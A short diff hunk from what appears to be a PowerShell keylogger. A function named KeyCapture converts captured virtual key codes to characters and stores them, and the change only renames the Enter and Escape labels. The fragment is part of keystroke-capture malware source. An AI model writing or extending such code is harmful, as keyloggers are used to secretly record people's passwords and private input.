@@ -968,8 +968,8 @@ Function KeyCapture {
                     if ($API::ToUnicode($asc, $vtkey, $kbst, $logchar, $logchar.Capacity, 0)) {
                     $LString = $logchar.ToString()
                         if ($asc -eq 8) {$LString = "[BKSP]"}
-                        if ($asc -eq 13) {$LString = "[ENT]"}
-                        if ($asc -eq 27) {$LString = "[ESC]"}
+                        if ($asc -eq 13) {$LString = "[ENTER]"}
+                        if ($asc -eq 27) {$LString = "[ESCAPE]"}
                         $nosave += $LString 
                         }
                     }
